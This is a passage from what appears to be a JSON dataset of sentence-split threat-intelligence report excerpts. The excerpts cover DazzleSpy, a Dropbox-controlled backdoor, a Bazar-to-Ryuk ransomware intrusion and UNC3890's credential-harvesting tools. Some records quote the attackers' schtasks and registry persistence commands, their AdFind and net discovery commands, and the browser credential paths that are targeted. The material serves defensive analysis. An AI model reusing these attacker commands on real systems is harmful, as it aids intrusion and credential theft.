        "id": "cti_reports_filtered/r-1100.md:::S28",
        "text": "As explained by Google TAG, the JavaScript loads a Mach-O executable file in memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S29",
        "text": "The rudimentary loader does not implement importing symbols from external libraries; instead, the addresses of dlopen and dlsym are patched into the loaded Mach-O. These can then be used from the executable to dynamically load and get the addresses of functions from external libraries.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S30",
        "text": "Now that code execution has been gained, the next stage is a Mach-O that is loaded into memory and executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S31",
        "text": "This Mach-O exploits a local privilege escalation vulnerability to run the next stage as root.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S32",
        "text": "Our examination confirms Google\u2019s analysis that the exploited vulnerability was described by Xinru Chi and Tielei Wang in a presentation at zer0con 2021, but it was also presented in more details at MOSEC 2021 by Tielei Wang.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S33",
        "text": "The vulnerability has been assigned CVE-2021-30869.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S34",
        "text": "Figure 7 shows a call to a function Tielei Wang called adjust_port_type in his last presentation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S35",
        "text": "This function, responsible for changing the internal type of a Mach port, is implemented the same way in the Mach-O as was presented at MOSEC.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S36",
        "text": "Changing the type of a Mach port shouldn\u2019t be possible unless a vulnerability exists.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S37",
        "text": "To summarize, the Mach-O does the following:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S38",
        "text": "- Downloads a file from the URL supplied as an argument\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S39",
        "text": "- Decrypts this file using AES-128-EBC and TEA with a custom delta",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S40",
        "text": "- Writes the resulting file to $TMPDIR/airportpaird and makes it executable\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S41",
        "text": "- Uses the privilege escalation exploit to remove the com.apple.quarantineattribute from the file to avoid asking the user to confirm the launch of the unsigned executable\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S42",
        "text": "- Uses the same privilege escalation to launch the next stage with root privileges\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S43",
        "text": "The decrypted payload is where our analysis differs the most from what was described by Google TAG: the payload delivered to vulnerable visitors to the D100 site was new macOS malware we\u2019ve named DazzleSpy.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S44",
        "text": "DazzleSpy is a full-featured backdoor that provides attackers a large set of functionalities to control, and exfiltrate files from, a compromised computer.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S45",
        "text": "Our sample is a Mach-O binary file compiled for x86_64 CPU architecture.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S46",
        "text": "In order to persist on the compromised device, the malware adds a Property List file (plist; see Figure 8) named com.apple.softwareupdate.plist to the LaunchAgents folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S47",
        "text": "The malware executable file is named softwareupdate and saved in the $HOME/.local/ folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S48",
        "text": "DazzleSpy connects to a hardcoded C&C server; the IP address and port found in the sample we decrypted was 88.218.192[.]128:5633.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S49",
        "text": "At first, the malware performs a TLS handshake, then uses a custom protocol to exchange JSON objects to deliver commands from the C&C server to compromised Macs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S50",
        "text": "DazzleSpy\u2019s binary contains an X.509 certificate used as a certificate authority (CA).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S51",
        "text": "It verifies that the server\u2019s certificate is issued by that authority.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S52",
        "text": "In practice, the same self-signed certificate is used for both the CA and the C&C server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md:::S53",
        "text": "The technique protects the malware\u2019s communications from potential eavesdropping by refusing to send data if end-to-end encryption is not possible.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S0",
        "text": "Our investigation started with the emails sent from an employee of the Administrative Office of the President in Afghanistan to the employees of the Afghanistan National Security Council (NSC).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S1",
        "text": "The email asked the recipient to review the modifications in the document related to the upcoming press conference of the NSC.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S2",
        "text": "The email contains a password-protected RAR archive named NSC Press conference.rar .",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S3",
        "text": "Extracting the archive with the password provided in the email requires user interaction and therefore provides a challenge for some sandbox security solutions.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S4",
        "text": "The extracted file, NSC Press conference.exe , acts as a dropper.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S5",
        "text": "The content of the lure email suggests that the attached file is the document, hence, to reduce the suspicion of the victim running the executable, the attackers use the simple trick \u2013 the first document on the victim\u2019s desktop is opened for the user upon the dropper execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S6",
        "text": "Whether the dropper found a document to open or not, it will proceed to the next stage \u2013 drop the backdoor to C:\\users\\public\\spools.exe and execute it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S7",
        "text": "The backdoor contain narrow capabilities: download and upload files, run commands and send the attackers the results.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S8",
        "text": "However short the list, they allow the attackers to upload and execute additional tools for further reconnaissance and lateral movement.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S9",
        "text": "To hide malicious functionality \u2013 persistence and C&C communication \u2013 from static detections, the malware uses a common obfuscation technique known as \u201cstackstrings\u201d to build wide char strings.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S10",
        "text": "The backdoor utilizes Dropbox as a C&C server, by sending and receiving commands written to a specific folder in a specially created Dropbox account, prepared by the attacker before the operation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S11",
        "text": "By using the legitimate Dropbox service for C&C communications, instead of regular dedicated server infrastructure, aids in masking the malicious traffic in the target\u2019s network, as no communication to abnormal websites is taking place.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S12",
        "text": "The backdoor uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S13",
        "text": "In the initialization stage, the backdoor creates a unique folder for the victim in an attacker-controlled Dropbox account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S14",
        "text": "The folder is named by the victim\u2019s MAC address which is obtained using GetAdaptersInfo API.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S15",
        "text": "Locally, the backdoor creates a working folder at C:\\users\\public\\<d> (where <d> is a random integer).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S16",
        "text": "It then proceeds by uploading two files to the server:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S17",
        "text": "- m-<date>.txt \u2013 containing the backdoor execution path",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S18",
        "text": "- d-<date>.txt \u2013 containing the local working folder path.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S19",
        "text": "When the attackers need to send a file or command to the victim machine, they place them to the folder named d in the victim\u2019s Dropbox folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S20",
        "text": "The malware retrieves this folder and downloads all its contents to the working folder.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S21",
        "text": "Finally, if the file named c.txt \u2013 that contains the attacker command, exists in this working folder, the backdoor executes it using the ComSpec environment variable, which normally points to the command line interpreter (like cmd.exe ), and uploads the results back to the Dropbox drive while deleting the command from the server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S22",
        "text": "The backdoor establishes persistence by setting the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load registry key to point to its executable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S23",
        "text": "This method is less common than Run or RunOnce keys but achieves its ultimate goal: the program listed in the Load registry value runs when any user logs on.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S24",
        "text": "Once the C&C communication is established, the threat actor starts by executing fingerprinting and reconnaissance commands on the machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S25",
        "text": "In this attack, some of the actions we spotted included:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S26",
        "text": "- Download and execution of ntbscan (SHA-1: 90da10004c8f6fafdaa2cf18922670a745564f45 ) \u2013 NetBIOS scanner tool widely used by multiple APT actor including the prolific Chinese group APT10\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S27",
        "text": "- Execution of Windows built-in networking utility tools\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1107.md:::S28",
        "text": "- Access to the victim\u2019s files, especially documents located on the Desktop\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S0",
        "text": "Like in our prior two reports of Ryuk campaigns, the initial access came from phishing emails containing links to google drive that when clicked, downloaded a Bazar Loader backdoor executable.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S1",
        "text": "In our prior cases we generally saw a lag time, ranging hours to days, from the initial click to Ryuk.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S2",
        "text": "In this case, the time from initial Bazar execution to domain recon was 5 minutes, and deployment of Cobalt Strike beacons was within 10 minutes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S3",
        "text": "This is by far the quickest we have seen them act.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S4",
        "text": "After bringing in Cobalt Strike, we saw familiar TTP\u2019s with using AdFind to continue domain discovery activity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S5",
        "text": "In this case, we saw them deploy persistence on the beachhead host, an action we had not previously seen in our other cases.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S6",
        "text": "After establishing another C2 for an additional Cobalt Strike beacon, they employed the Zerologon exploit (CVE 2020-1472) and obtained domain admin level privileges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S7",
        "text": "We also saw host process injection on the beachhead used for obfuscation and privilege escalation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S8",
        "text": "With domain administrator privileges obtained, the threat actors then moved laterally throughout the network using SMB and RDP to deploy Cobalt Strike beacons on the domain controllers around 1 hour after the initial execution of Bazar.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S9",
        "text": "On the domain controllers, some additional discovery was done using the PowerShell Active Directory module.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S10",
        "text": "From there, they targeted other severs in the environment; specifically, back up systems, file servers, and software deployment servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S11",
        "text": "After establishing Cobalt Strike beacons on those they felt ready to proceed to their final objectives.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S12",
        "text": "At the 2 hour mark the threat actors made the move to deploy Ryuk ransomware by establishing RDP connections from the domain controllers to servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S13",
        "text": "This continued for the next hour until the entire domain had been encrypted, with that work completing just 3 hours after the first Bazar Loader was executed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S14",
        "text": "Initial access via a phishing email that linked to a google docs page that enticed the user to download a report, which was a Bazar Loader executable file instead Report-Review20-10.exe.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S15",
        "text": "Execution of the initial Bazar Loader malware relies on user interaction.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S16",
        "text": "Executables transferred over SMB during lateral movement were commonly executed via a service.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S17",
        "text": "This time, unlike prior investigations, clear persistence was found setup on the beachhead host.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S18",
        "text": "Firefox.exe created these scheduled tasks as well as the run key.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S19",
        "text": "\"C:\\Windows\\System32\\schtasks.exe\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S20",
        "text": "/CREATE /SC ONSTART",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S21",
        "text": "/TN jf0c /TR \"'C:\\Users\\pagefilerpqy.exe'\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S22",
        "text": "/f \"C:\\Windows\\System32\\schtasks.exe\" /CREATE /SC ONSTART /TN jf0c",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S23",
        "text": "/TR \"'C:\\Users\\pagefilerpqy.exe'\" /f /RL HIGHEST \"C:\\Windows\\System32\\schtasks.exe\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S24",
        "text": "/CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S25",
        "text": "/TR \"'C:\\Users\\pagefilerpqy.exe'\" /f \"C:\\Windows\\System32\\schtasks.exe\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S26",
        "text": "/CREATE /SC ONCE /ST 17:21:58 /TN 9T6ukfi6",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S27",
        "text": "/TR \"'C:\\Users\\pagefilerpqy.exe'\" /f /RL HIGHEST REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \\\"microsoft update\\\" /t REG_SZ /F /D \"SCHTASKS /run /tn 9T6ukfi6\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S28",
        "text": "The Zerologon vulnerability CVE 2020-1472 was again exploited to obtain domain admin level privileges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S29",
        "text": "Rubeus was used to kerberoast the environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S30",
        "text": "Process injection was used on the beachhead host to to inject into svchost.exe\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S31",
        "text": "The Bazar Loader malware was using a code signing certificate signed by Digicert under the organization NOSOV SP Z O O",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S32",
        "text": "At the time of delivery, the executable had a detection rate of 1/69 in Virustotal.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S33",
        "text": "The Cobalt Strike beacons used in the environment used similar code signing certificates.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S34",
        "text": "In previous cases, we generally saw some lag time between infection and further actions but this time things moved much quicker, starting with initial discovery executed by Bazar less than 5 minutes after initial execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S35",
        "text": "Discovery command run by Bazar: net view /all net view /all /domain nltest /domain_trusts /all_trusts net localgroup \"administrator\" net group \"domain admins\" /dom",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S36",
        "text": "Seven minutes later, after launching a Cobalt Strike beacon, AdFind was used\u2013 running the same discovery pattern seen in previous reporting.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S37",
        "text": "This was started via a bat script.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S38",
        "text": "It appears that the threat actors are now piping these commands into a batch file one at a time instead of dropping adf.bat to disk.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S39",
        "text": "AdFind.exe -f \"(objectcategory=person)\" AdFind.exe -f \"(objectcategory=computer)\"",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S40",
        "text": "AdFind.exe -f \"(objectcategory=organizationalUnit)\" AdFind.exe -sc trustdmp",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S41",
        "text": "AdFind.exe -subnets -f \"(objectCategory=subnet)\" AdFind.exe -f \"(objectcategory=group)\" AdFind.exe -gcb -sc trustdmp",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S42",
        "text": "Once on the domain controller the PowerShell Active Directory module was loaded.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S43",
        "text": "RDP connections were initiated from Cobalt Strike Beacons running on the beachhead host to two domain controllers and then Cobalt Strike executables were dropped by these connections.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S44",
        "text": "In addition to using RDP to move around the environment execuatables were also transferred over SMB to ADMIN$ shares and executed as a service.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S45",
        "text": "\\\\HOSTNAME\\ADMIN$\\ff49429.exe",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S46",
        "text": "Discovery data (AdFind and Rubeus outputs ) was exfiltrated out of the network via FTP.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S47",
        "text": "5.2.70.149:21",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S48",
        "text": "At roughly the 2 hour mark, we saw the threat actors begin to act on their final objectives.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S49",
        "text": "RDP connections were initiated from one of the domain controllers and the Ryuk executables were deployed and executed over these RDP connections.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S50",
        "text": "Servers such as the backup systems, file servers, and automation tools were targeted first, followed by workstations.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S51",
        "text": "Commands ran prior to ransom execution:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1117.md:::S52",
        "text": "While encryption was started 2 hours into the attack, by the 3 hour mark the actors had completed ransom of the entire environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S0",
        "text": "While Mandiant primarily identified post-exploitation implants utilized by UNC3890, there are some findings that shed light about their initial access methodologies.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S1",
        "text": "Mandiant identified UNC3890 potentially used the following initial access vectors:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S2",
        "text": "Watering holes \u2013 Mandiant identified a potential watering hole hosted on a login page of a legitimate Israeli shipping company, which was likely compromised by UNC3890.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S3",
        "text": "The watering hole was active at least until November 2021, and upon entering the legitimate login page, the user would be sending a POST request with preliminary data about the logged user to an attacker controlled non-ASCII Punycode domain (lir\u0131kedin[.]com, interpreted as xn--lirkedin-vkb[.]com).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S4",
        "text": "The URL structure of the POST request: hxxps[:]//xn--lirkedin-vkb[.]com/object[.]php?browser=<user_browser>&ip=<user_ip>\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S5",
        "text": "When we inspected the watering hole, it was already inactive, but it was most likely used to target clients and users of that Israeli shipping company, in particular, one\u2019s shipping or handling heat-sensitive cargo (based on the nature of the compromised website).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S6",
        "text": "We have an additional indication of an attempted targeting of another major Israeli shipping company by UNC3890, which is consistent with the watering hole.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S7",
        "text": "Credentials harvesting by masquerading as legitimate services \u2013 we uncovered several domains resolving to UNC3890\u2019s C2 servers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S8",
        "text": "Some of the domains were masquerading as legitimate services and entities, as can be observed in the table below.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S9",
        "text": "UNC3890 may have used these domains to harvest credentials to legitimate services, to send phishing lures, or to overall mask their activity and blend in with expected network traffic.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S10",
        "text": "It should be noted that many of these domains were hosted on the same infrastructure used by UNC3890, but date back to late 2020, which is before we can corroborate UNC3890 has been active.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S11",
        "text": "In addition, we identified an UNC3890 server that hosted several ZIP files containing scraped contents of Facebook and Instagram accounts of legitimate individuals.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S12",
        "text": "It is possible they were targeted by UNC3890, or used as lures in a social engineering effort.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S13",
        "text": "Fake job offers, potentially as part of a phishing or watering hole campaign \u2013 we observed UNC3890 utilize a .xls lure file designed as a fake job offer (MD5: 639f83fa4265ddbb43e85b763fe3dbac) which installs SUGARDUMP, a credential harvesting tool.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S14",
        "text": "The job offer was for a software developer position in LexisNexis, a company offering a data analytics solution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S15",
        "text": "Fake commercials for AI-based robotic dolls \u2013 one of UNC3890\u2019s most recent endeavor to target victims includes the usage of a video commercial for AI-based robotic dolls, used as a lure to deliver SUGARDUMP.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S16",
        "text": "In addition, we observed UNC3890 usage of domains with similar themes such as naturaldolls[.]store (hosting a fake Outlook login page) and xxx-doll[.]com.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S17",
        "text": "In addition, UNC3890 infrastructure hosted a fake page for the alleged purchasing of robotic dolls, redirecting victims to an attacker controlled infrastructure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S18",
        "text": "After gaining initial access, UNC3890 utilizes a broad toolset to access and control the victim\u2019s environment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S19",
        "text": "In this sector we will focus on the analysis of two of UNC3890\u2019s proprietary tools we identified in our investigation: the SUGARUSH backdoor, and the SUGARDUMP credential harvesting tool.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S20",
        "text": "We will also provide a brief analysis of the public tools utilized by UNC3890.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S21",
        "text": "Most of the tools were available for download directly from UNC3890 controlled infrastructure, indicating they may have been served as 1st stage implants.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S22",
        "text": "Alternatively, they may have been used as 2nd stages (or later), but UNC3890 may have misconfigured their infrastructure, making it publicly accessible.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S23",
        "text": "SUGARUSH is a small custom backdoor that establishes a reverse shell over TCP to a hardcoded C&C address.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S24",
        "text": "Upon first execution, SUGARUSH will create a new service called \u201cService1\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S25",
        "text": "Subsequently, SUGARUSH creates a logging folder called \u201cLogs\u201d, and stores it under its current execution path.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S26",
        "text": "A new folder named\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S27",
        "text": "\u201cServiceLog\u201d is created in the \u201cLogs\u201d folder, and a new log file is written with the message \u201cService is started at <current_date>\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S28",
        "text": "The name of the log files is the current date of the infected machine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S29",
        "text": "SUGARUSH will then check for internet connectivity of the host and will create a log file indicating the result with message \u201cYou are online at <current_date>\u201d or \u201cYou are offline at <current_date>\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S30",
        "text": "If the attempt for internet connection is successful, SUGARUSH will establish a new TCP connection to an embedded C&C address via port 4585.\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S31",
        "text": "SUGARUSH then waits to receive an answer from the C2 which will be interpreted as a CMD command for execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S32",
        "text": "SUGARUSH Samples:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S33",
        "text": "- 37bdb9ea33b2fe621587c887f6fb2989",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S34",
        "text": "- 3f045ebb014d859a4e7d15a4cf827957",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S35",
        "text": "- a7a2d6a533b913bc50d14e91bcf6c716",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S36",
        "text": "- d528e96271e791fab5818c01d4bc139f",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S37",
        "text": "SUGARDUMP is a small custom utility used for harvesting credentials from Chrome, Opera and Edge Chromium browsers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S38",
        "text": "When executed SUGARDUMP will access the following paths:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S39",
        "text": "- %AppData%\\\\Google\\\\Chrome\\\\User Data",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S40",
        "text": "- %AppData&\\\\Opera Software\\\\Opera Stable",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S41",
        "text": "- %AppData%\\\\Microsoft\\\\Edge\\\\User Data",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S42",
        "text": "Out of each path SUGARDUMP will attempt collect specific folders:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S43",
        "text": "- \\\\Default\\\\Login Data",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S44",
        "text": "- \\\\Login Data",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S45",
        "text": "- Any other folder that has the string \u201cProfile\u201d in its name.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S46",
        "text": "Afterwards, SUGARDUMP will extract all of the available usernames and passwords from these folders.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S47",
        "text": "The collected information is subsequently stored in the following format:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S48",
        "text": "We observed several versions of SUGARDUMP:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S49",
        "text": "- SUGARDUMP first known version, dated to early 2021.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S50",
        "text": "This early version stores the credentials without exfiltrating them.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S51",
        "text": "It is possible it was an unfinished version, or that UNC3890 used other tools and/or manually connect to the victim to exfiltrate the stolen credentials.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S52",
        "text": "- SUGARDUMP using SMTP-based communication, dated to late 2021-early 2022.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S53",
        "text": "This version utilizes Yahoo, Yandex and Gmail addresses for exfiltration, and uses a commercial AI-driven robotic dolls as a lure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S54",
        "text": "- SUGARDUMP using HTTPs-based communication, dated to April 2022.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S55",
        "text": "This version uses a fake NexisLexis job offer as a lure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S56",
        "text": "SUGARDUMP first known version \u2013 dated to early 2021, we observed two variants of this version: the first one saves the stolen credentials under in a .txt file under the path: \u201cC:\\\\Users\\\\User\\\\Desktop\\\\test2.txt\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S57",
        "text": "The second variant prints the stolen credentials as a CMD output.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S58",
        "text": "We observed two PDB paths contained in SUGARDUMP samples:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S59",
        "text": "- C:\\Users\\User\\source\\repos \\passrecover\\passrecover\\obj\\Release\\passrecover.pdb \u2013 we observed a similar PDB path (the part in bold ) used in a toolset (for example, MD5: 69b2ab3369823032991d4b306a170425) by UNC2448, an actor affiliated with Iran, which was mentioned in a U.S. government statement in November 17, 2021.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-1122.md:::S60",
